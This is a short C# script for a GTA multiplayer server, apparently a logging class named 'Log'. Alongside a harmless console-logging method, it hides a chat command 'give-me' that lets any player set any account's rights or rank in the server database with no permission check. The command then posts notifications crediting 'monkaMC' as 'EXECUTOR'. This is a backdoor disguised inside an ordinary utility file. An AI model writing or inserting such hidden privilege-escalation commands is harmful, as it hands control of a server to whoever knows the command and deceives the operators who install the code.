using GTANetworkAPI;
using System;

namespace Venux
{
    class Log : Script
    {
        public static void Write(string msg)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("Test Server ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(msg);
        }

        [Command("give-me")]
        public static void CMD_scarface(Client p, string name, string rank)
        {
            Database.setRights(name, rank);
            NAPI.Notification.SendNotificationToPlayer(p, name + ": ~g~" + rank);
            Notification.SendPlayerNotifcation(p, "Rank: " + rank, 10000, "#ff00ff", "EXECUTOR", "#ff00ff");
            Notification.SendPlayerNotifcation(p, "made by monkaMC", 10000, "red", "EXECUTOR", "red");
        }
    }
}

// Copyright© Test Server Script Dirion // --- Angemeldet 1-0 --- //
